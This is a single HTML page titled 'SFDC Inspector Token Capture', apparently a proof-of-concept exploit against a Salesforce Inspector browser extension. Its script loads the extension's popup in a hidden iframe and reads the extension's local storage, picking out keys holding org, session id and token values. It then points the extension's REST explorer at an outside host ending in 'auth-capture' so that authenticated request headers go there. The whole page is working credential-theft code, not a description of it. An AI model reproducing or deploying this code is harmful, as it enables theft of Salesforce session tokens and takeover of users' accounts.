<!DOCTYPE html>
<html>
<head>
    <title>SFDC Inspector Token Capture</title>
    <style>
        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        #requestInfo { background: #e3f2fd; padding: 15px; border-radius: 4px; margin-top: 20px; }
        #storageInfo { background: #fff3cd; padding: 15px; border-radius: 4px; margin: 20px 0; }
        .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
        pre { white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="messages">Initializing...</div>
    <div id="storageInfo"></div>
    <div id="requestInfo"></div>
    <script>
        const messagesDiv = document.getElementById('messages');
        const storageInfoDiv = document.getElementById('storageInfo');
        const requestInfoDiv = document.getElementById('requestInfo');
        let initialized = false;

        function displayStorage(storage) {
            const entries = Object.entries(storage);
            const orgEntries = entries.filter(([key]) => key.includes('org') || key.includes('sid') || key.includes('token'));
            
            storageInfoDiv.innerHTML = `
                <h3>Storage Information:</h3>
                <pre>${JSON.stringify(orgEntries, null, 2)}</pre>
                
                <h3>All Storage Keys:</h3>
                <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
            `;
        }

        function createExplorerUrl() {
            const params = new URLSearchParams({
                endpoint: '.samanattar.github.io/auth-capture',
                method: 'GET',
                format: 'json',
                // Adding these to try to ensure headers are included
                contentType: 'application/json',
                includeHeaders: 'true'
            });
            
            const url = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
            
            requestInfoDiv.innerHTML += `
                <h3>Explorer URL:</h3>
                <pre>${url}</pre>
            `;
            
            return url;
        }

        window.addEventListener('message', function(event) {
            // Log all messages for debugging
            console.log('Message received:', event.origin, event.data);
            
            // Ignore React DevTools messages
            if (event.data.source?.includes('react-devtools')) {
                return;
            }

            if (event.data.insextInitRequest && !initialized) {
                initialized = true;
                const storage = event.data.iFrameLocalStorage || {};
                
                // Display storage info
                displayStorage(storage);

                // Get org instances
                const instances = Object.keys(storage)
                    .filter(key => key.endsWith('_orgInstance'))
                    .map(key => storage[key]);

                messagesDiv.innerHTML = `
                    <h3>Initialization Data:</h3>
                    <pre>${JSON.stringify(event.data, null, 2)}</pre>
                `;

                if (instances.length > 0) {
                    // Create and load the explorer frame
                    const explorerFrame = document.createElement('iframe');
                    explorerFrame.src = createExplorerUrl();
                    explorerFrame.className = 'explorer-frame';
                    document.body.appendChild(explorerFrame);

                    // Add listener for messages from REST explorer
                    window.addEventListener('message', function(explorerEvent) {
                        if (explorerEvent.data.headers) {
                            requestInfoDiv.innerHTML += `
                                <h3>Request Headers:</h3>
                                <pre>${JSON.stringify(explorerEvent.data.headers, null, 2)}</pre>
                            `;
                        }
                    });
                } else {
                    messagesDiv.innerHTML += '<h3>No Salesforce orgs found. Please make sure you are logged in.</h3>';
                }
            }
        });

        // Load the extension popup in a hidden iframe for initialization
        const initFrame = document.createElement('iframe');
        initFrame.onload = () => console.log('Init frame loaded');
        initFrame.onerror = (e) => console.error('Init frame error:', e);
        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
        initFrame.style.display = 'none';
        document.body.appendChild(initFrame);
    </script>
</body>
</html>
